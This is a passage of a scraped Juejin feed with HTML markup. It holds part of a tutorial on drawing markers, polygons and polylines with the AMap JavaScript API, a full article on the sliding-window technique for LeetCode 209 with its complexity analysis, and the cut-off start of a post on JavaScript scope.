    toolbar.<span class="hljs-title function_">show</span>()
</code></pre>
<p>控件是插件系统的一部分 高德地图提供了<a href="https://link.juejin.cn?target=https%3A%2F%2Flbs.amap.com%2Fapi%2Fjavascript-api-v2%2Fguide%2Fabc%2Fplugins-list" target="_blank" title="https://lbs.amap.com/api/javascript-api-v2/guide/abc/plugins-list" ref="nofollow noopener noreferrer">官方插件</a></p>
<h2 data-id="heading-5">点标记</h2>
<p>与控件相比 点标记可以添加多个相同类型的</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79a6a2a6cf73484a9949d4af6a428c7c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFuZXRoZURpdmluZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770903711&amp;x-signature=6V1V2nAXwkUCZoxBRwNRJlmmVb8%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-js" lang="js">  <span class="hljs-comment">//点标记显示内容 outerHTML</span>
  <span class="hljs-keyword">const</span> markerContent = <span class="hljs-string">`&lt;img src="//a.amap.com/jsapi_demos/static/demo-center/icons/dir-via-marker.png"&gt;`</span>
  <span class="hljs-comment">// 点标记经纬度</span>
  <span class="hljs-keyword">const</span> position = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMap</span>.<span class="hljs-title class_">LngLat</span>(<span class="hljs-number">116.397428</span>, <span class="hljs-number">39.90923</span>)
  <span class="hljs-keyword">const</span> marker = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMap</span>.<span class="hljs-title class_">Marker</span>({
    position,
    <span class="hljs-attr">content</span>: markerContent,
    <span class="hljs-comment">// position是marker左上角的坐标 offset是在此基础上的偏移</span>
    <span class="hljs-comment">// 此处是为了让marker的下边中心处于position位置</span>
    <span class="hljs-attr">offset</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMap</span>.<span class="hljs-title class_">Pixel</span>(-<span class="hljs-number">13</span>, -<span class="hljs-number">30</span>),
    <span class="hljs-attr">draggable</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 允许拖拽</span>
  })
  
  <span class="hljs-comment">// 添加/移除点标记</span>
  map.<span class="hljs-title function_">add</span>(marker)
  map.<span class="hljs-title function_">remove</span>(marker)
  <span class="hljs-comment">// 监听标记事件 </span>
  marker.<span class="hljs-title function_">on</span>(<span class="hljs-string">'click'</span>, <span class="hljs-variable language_">console</span>.<span class="hljs-property">log</span>)
</code></pre>
<p>点标记的offset类型是<a href="https://link.juejin.cn?target=https%3A%2F%2Flbs.amap.com%2Fapi%2Fjavascript-api-v2%2Fdocumentation%23pixel" target="_blank" title="https://lbs.amap.com/api/javascript-api-v2/documentation#pixel" ref="nofollow noopener noreferrer">Amap.Pixel</a> 单位是px</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Flbs.amap.com%2Fapi%2Fjavascript-api-v2%2Fdocumentation%23%25e7%2582%25b9%25e6%25a0%2587%25e8%25ae%25b0" target="_blank" title="https://lbs.amap.com/api/javascript-api-v2/documentation#%e7%82%b9%e6%a0%87%e8%ae%b0" ref="nofollow noopener noreferrer">完整的点标记文档</a></p>
<h2 data-id="heading-6">多边形</h2>
<p>在地图上绘制多边形</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c7616d86a394c7f8bdbe48e5260614b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFuZXRoZURpdmluZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770903711&amp;x-signature=QGoBDQo85d5KAbJgHuP60EpKhEo%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-js" lang="js">  <span class="hljs-keyword">const</span> path = [
    [
      [<span class="hljs-number">116.35</span>, <span class="hljs-number">39.92</span>],
      [<span class="hljs-number">116.46</span>, <span class="hljs-number">39.92</span>],
      [<span class="hljs-number">116.46</span>, <span class="hljs-number">39.86</span>],
      [<span class="hljs-number">116.35</span>, <span class="hljs-number">39.86</span>],
    ],
  ]

  <span class="hljs-keyword">const</span> polygon = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMap</span>.<span class="hljs-title class_">Polygon</span>({
    <span class="hljs-attr">path</span>: path,
    <span class="hljs-attr">draggable</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 允许拖拽</span>
  })
  map.<span class="hljs-title function_">add</span>(polygon)
</code></pre>
<p>path按照顺时针顺序</p>
<p>如果需要镂空多边形</p>
<pre><code class="hljs language-js" lang="js">  <span class="hljs-keyword">const</span> path = [
    [
      [<span class="hljs-number">116.35</span>, <span class="hljs-number">39.92</span>],
      [<span class="hljs-number">116.46</span>, <span class="hljs-number">39.92</span>],
      [<span class="hljs-number">116.46</span>, <span class="hljs-number">39.86</span>],
      [<span class="hljs-number">116.35</span>, <span class="hljs-number">39.86</span>],
    ],
    <span class="hljs-comment">// 后面的所有坐标都镂空</span>
    [
      [<span class="hljs-number">116.359</span>, <span class="hljs-number">39.9</span>],
      [<span class="hljs-number">116.4</span>, <span class="hljs-number">39.9</span>],
      [<span class="hljs-number">116.4</span>, <span class="hljs-number">39.869</span>],
      [<span class="hljs-number">116.359</span>, <span class="hljs-number">39.869</span>],
    ],
  ]
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad24573ca6664a3c9021c773df7ea366~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFuZXRoZURpdmluZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770903711&amp;x-signature=AdrmRPljX0GvVTfzduWUWsJeiF4%3D" alt="image.png" loading="lazy"/></p>
<p>可以用<code>polygon.on</code>添加事件 镂空的部分不触发事件</p>
<p>可以用<code>polygon.setOptions</code>调整颜色样式透明度等</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Flbs.amap.com%2Fapi%2Fjavascript-api-v2%2Fdocumentation%23%25e7%259f%25a2%25e9%2587%258f%25e5%259b%25be%25e5%25bd%25a2" target="_blank" title="https://lbs.amap.com/api/javascript-api-v2/documentation#%e7%9f%a2%e9%87%8f%e5%9b%be%e5%bd%a2" ref="nofollow noopener noreferrer">多边形文档</a></p>
<p>如果需要节点可拖拽 参考<a href="https://link.juejin.cn?target=https%3A%2F%2Flbs.amap.com%2Fapi%2Fjavascript-api-v2%2Fguide%2Famap-polygon%2Fpolygon%23t2" target="_blank" title="https://lbs.amap.com/api/javascript-api-v2/guide/amap-polygon/polygon#t2" ref="nofollow noopener noreferrer">多边形编辑文档</a></p>
<h2 data-id="heading-7">路径信息</h2>
<p>可以使用官方的路径规划能力 参考<a href="https://link.juejin.cn?target=https%3A%2F%2Flbs.amap.com%2Fapi%2Fjavascript-api-v2%2Ftutorails%2Fcar-dir" target="_blank" title="https://lbs.amap.com/api/javascript-api-v2/tutorails/car-dir" ref="nofollow noopener noreferrer">文档</a></p>
<h3 data-id="heading-8">自定义路径绘制</h3>
<p>使用Polylines</p>
<pre><code class="hljs language-js" lang="js">  <span class="hljs-keyword">const</span> path = [
    [<span class="hljs-number">116.4</span>, <span class="hljs-number">39.869</span>],
    [<span class="hljs-number">116.46</span>, <span class="hljs-number">39.86</span>],
    [<span class="hljs-number">116.35</span>, <span class="hljs-number">39.92</span>],
    [<span class="hljs-number">116.35</span>, <span class="hljs-number">39.86</span>],
  ]
  <span class="hljs-keyword">const</span> polyline = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMap</span>.<span class="hljs-title class_">Polyline</span>({
    path,
    <span class="hljs-attr">strokeWeight</span>: <span class="hljs-number">10</span>,
    <span class="hljs-attr">showDir</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">strokeOpacity</span>: <span class="hljs-number">1</span>,
    <span class="hljs-attr">lineJoin</span>: <span class="hljs-string">'round'</span>,
    <span class="hljs-attr">lineCap</span>: <span class="hljs-string">'round'</span>,
  })
  map.<span class="hljs-title function_">add</span>(polyline)
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29689b0dd3ef41e09eb97d7eca505964~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFuZXRoZURpdmluZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770903711&amp;x-signature=WGFsDY5GEYJQtopJOcSD29q8e4g%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[[硬核] 双指针进阶：从“对撞”到“滑动窗口”的思维跃迁]]></title>    <link>https://juejin.cn/post/7603219519666929683</link>    <guid>https://juejin.cn/post/7603219519666929683</guid>    <pubDate>2026-02-05T13:53:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603219519666929683" data-draft-id="7603142147643113515" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="[硬核] 双指针进阶：从“对撞”到“滑动窗口”的思维跃迁"/> <meta itemprop="keywords" content="前端,JavaScript,算法"/> <meta itemprop="datePublished" content="2026-02-05T13:53:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="NEXT06"/> <meta itemprop="url" content="https://juejin.cn/user/1176918763246011"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            [硬核] 双指针进阶：从“对撞”到“滑动窗口”的思维跃迁
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1176918763246011/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    NEXT06
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T13:53:23.000Z" title="Thu Feb 05 2026 13:53:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在上一篇关于“三数之和”的探讨中，我们深入剖析了如何利用<strong>排序</strong>和<strong>对撞双指针</strong>（Left 指针向右，Right 指针向左），将 </p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">O</span>(n3)<span class="hljs-built_in">O</span>(n3)
</code></pre>
<p> 的暴力解法优化至 </p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">O</span>(n2)<span class="hljs-built_in">O</span>(n2)
</code></pre>
<p>。</p>
<p>然而，在前端算法面试中，还有另一类涉及数组和字符串处理的高频题目，它们同样依赖双指针，但指针的移动方向却不再是“相对而行”，而是“同向而行”。这种特殊的双指针模式，就是<strong>滑动窗口（Sliding Window）</strong> 。</p>
<p>本文将以 LeetCode 209 题“长度最小的子数组”为例，剖析从暴力法到滑动窗口的思维路径，并重点讲解如何进行均摊复杂度分析。</p>
<h2 data-id="heading-1">一、 模式对比：对撞 vs 滑动</h2>
<p>在进入具体题目前，我们需要建立抽象的几何直觉。</p>
<ul>
<li>
<p><strong>对撞指针（如三数之和）</strong> ：</p>
<ul>
<li><strong>场景</strong>：数组有序，求固定和。</li>
<li><strong>形态</strong>：L -&gt; ... &lt;- R。区间两端向中间挤压。</li>
<li><strong>逻辑</strong>：根据当前和与目标值的大小，决定是舍弃左边（变大）还是舍弃右边（变小）。</li>
</ul>
</li>
<li>
<p><strong>滑动窗口（同向双指针）</strong> ：</p>
<ul>
<li><strong>场景</strong>：寻找满足条件的连续子数组/子串。</li>
<li><strong>形态</strong>：[L ... R] -&gt;。像一只毛毛虫，R 先走（扩张），L 随后（收缩）。</li>
<li><strong>逻辑</strong>：R 负责寻找可行解，L 负责优化解（寻找最短/最优）。</li>
</ul>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5297fefadd0a4f5ea017ce1a43874ea2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTkVYVDA2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904403&amp;x-signature=j%2BZgJKCRFiso140Bb2pQFdu55bA%3D" alt="屏幕录制 2026-02-05 185039.gif" loading="lazy"/></p>
<h2 data-id="heading-2">二、 题目解析：长度最小的子数组</h2>
<p><strong>题目描述</strong>：<br/>
给定一个含有 n 个正整数的数组 nums 和一个正整数 target 。找出该数组中满足其和 ≥ target 的长度最小的 <strong>连续子数组</strong>，并返回其长度。如果不存在，返回 0。</p>
<h3 data-id="heading-3">1. 暴力解法</h3>
<p>最直观的思路是：以每一个元素 nums[i] 为起点，向后寻找，直到和大于等于 target，记录长度，然后对比取最小值。</p>
<p>JavaScript</p>
<pre><code class="hljs language-ini" lang="ini">// 伪代码
for (let <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; n; i++) {</span>
    let <span class="hljs-attr">sum</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
    for (let <span class="hljs-attr">j</span> = i<span class="hljs-comment">; j &lt; n; j++) {</span>
        sum += nums<span class="hljs-section">[j]</span><span class="hljs-comment">;</span>
        if (sum &gt;= target) {
            <span class="hljs-attr">minLen</span> = Math.min(minLen, j - i + <span class="hljs-number">1</span>)<span class="hljs-comment">;</span>
            break<span class="hljs-comment">; // 找到以 i 开头的最短解，break</span>
        }
    }
}
</code></pre>
<p>这种解法存在大量的重复计算。当我们从 i 移动到 i+1 时，之前的区间和完全重新计算了，浪费了已知信息。</p>
<h3 data-id="heading-4">2. 滑动窗口解法</h3>
<p>我们使用两个指针 left 和 right 维护一个窗口。</p>
<ol>
<li><strong>扩张</strong>：right 主动向右走，累加窗口内的和 sum。</li>
<li><strong>收缩</strong>：当 sum &gt;= target 时，说明找到了一个可行解。此时，right 停下，left 开始向右走，试探能否在保持 sum &gt;= target 的前提下缩小窗口长度（优化解）。</li>
</ol>
<p>JavaScript</p>
<pre><code class="hljs language-ini" lang="ini">/**
 * @param {number} target
 * @param {number<span class="hljs-section">[]</span>} nums
 * @return {number}
 */
var <span class="hljs-attr">minSubArrayLen</span> = function(target, nums) {
    let <span class="hljs-attr">left</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
    let <span class="hljs-attr">right</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
    let <span class="hljs-attr">sum</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
    let <span class="hljs-attr">minLen</span> = Infinity<span class="hljs-comment">; // 初始化为无穷大</span>
    
    const <span class="hljs-attr">len</span> = nums.length<span class="hljs-comment">;</span>
    
    while (right &lt; len) {
        // 1. 进窗口：累加当前元素
        sum += nums<span class="hljs-section">[right]</span><span class="hljs-comment">;</span>
        
        // 2. 满足条件：尝试收缩窗口，寻找更优解
        while (sum &gt;= target) {
            // 更新最小长度
            <span class="hljs-attr">minLen</span> = Math.min(minLen, right - left + <span class="hljs-number">1</span>)<span class="hljs-comment">;</span>
            
            // 出窗口：减去左边的元素
            sum <span class="hljs-attr">-</span>= nums[left]<span class="hljs-comment">;</span>
            // 左指针右移
            left++<span class="hljs-comment">;</span>
        }
        
        // 继续扩张
        right++<span class="hljs-comment">;</span>
    }
    
    return <span class="hljs-attr">minLen</span> === Infinity ? <span class="hljs-number">0</span> : minLen<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b36b0780f72c4533a95aa7f830639f4e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTkVYVDA2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770904403&amp;x-signature=wapwgWVVLShuDdJO%2FrsDx6Fz94E%3D" alt="屏幕录制 2026-02-05 190406.gif" loading="lazy"/></p>
<h2 data-id="heading-5">三、 核心难点：时间复杂度分析</h2>
<p>这是一个面试中的高频陷阱。</p>
<p>很多候选人看到代码中有一个 while (right &lt; len) 循环，内部嵌套了一个 while (sum &gt;= target) 循环，会下意识地认为时间复杂度是 </p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">O</span>(n2)<span class="hljs-built_in">O</span>(n2)
</code></pre>
<p>。</p>
<p><strong>这是错误的。</strong></p>
<p><strong>分析逻辑</strong>：<br/>
时间复杂度看的是<strong>基本操作的执行次数</strong>。<br/>
在整个算法运行过程中：</p>
<ol>
<li>right 指针：从 0 走到 n-1，每个元素进窗口 1 次。总共移动 n 次。</li>
<li>left 指针：从 0 走到 n-1（最多），每个元素出窗口 1 次。总共移动 n 次。</li>
</ol>
<p><strong>结论</strong>：<br/>
尽管是双层循环，但两个指针都是单调递增的，不会回退。数组中的每个元素最多被操作两次（进一次，出一次）。<br/>
总操作次数为 2n2n，常数忽略，因此时间复杂度为 <strong><code>O(n)</code></strong>。</p>
<p>这种分析方法被称为<strong>均摊复杂度分析</strong>。</p>
<h2 data-id="heading-6">四、 总结与通用模板</h2>
<p>滑动窗口算法本质上是维护了一组满足特定规则的数据集合。解决此类问题的通用模板如下：</p>
<p>JavaScript</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">/* 滑动窗口通用模板 */</span>
function <span class="hljs-built_in">slidingWindow</span>(nums) {
    let <span class="hljs-attribute">left</span> = <span class="hljs-number">0</span>, <span class="hljs-attribute">right</span> = <span class="hljs-number">0</span>;
    
    while (right &lt; nums.length) {
        <span class="hljs-comment">// c 是将移入窗口的字符</span>
        let c = nums<span class="hljs-selector-attr">[right]</span>;
        <span class="hljs-comment">// 1. 右移窗口，进行数据更新</span>
        ...
        
        <span class="hljs-comment">// 2. 判断左侧窗口是否要收缩 (根据题目条件：如 sum &gt;= target 或 窗口长度超限)</span>
        while (window needs shrink) {
            <span class="hljs-comment">// d 是将移出窗口的字符</span>
            let d = nums<span class="hljs-selector-attr">[left]</span>;
            <span class="hljs-comment">// 3. 左移窗口，进行数据更新</span>
            ...
            <span class="hljs-attribute">left</span>++;
        }
        <span class="hljs-attribute">right</span>++;
    }
}
</code></pre>
<p>从“三数之和”的<strong>对撞指针</strong>，到“最小子数组”的<strong>滑动窗口</strong>，我们完成了从<strong>静态位置判定</strong>到<strong>动态区间维护</strong>的进阶。掌握了这两个模型，就攻克了数组算法题的半壁江山。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[探索JS作用域]]></title>    <link>https://juejin.cn/post/7602991346586124322</link>    <guid>https://juejin.cn/post/7602991346586124322</guid>    <pubDate>2026-02-05T15:14:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602991346586124322" data-draft-id="7603201727714934836" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="探索JS作用域"/> <meta itemprop="keywords" content="JavaScript,前端"/> <meta itemprop="datePublished" content="2026-02-05T15:14:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="偶像佳沛"/> <meta itemprop="url" content="https://juejin.cn/user/2561180400626944"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            探索JS作用域
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2561180400626944/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    偶像佳沛
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T15:14:46.000Z" title="Thu Feb 05 2026 15:14:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 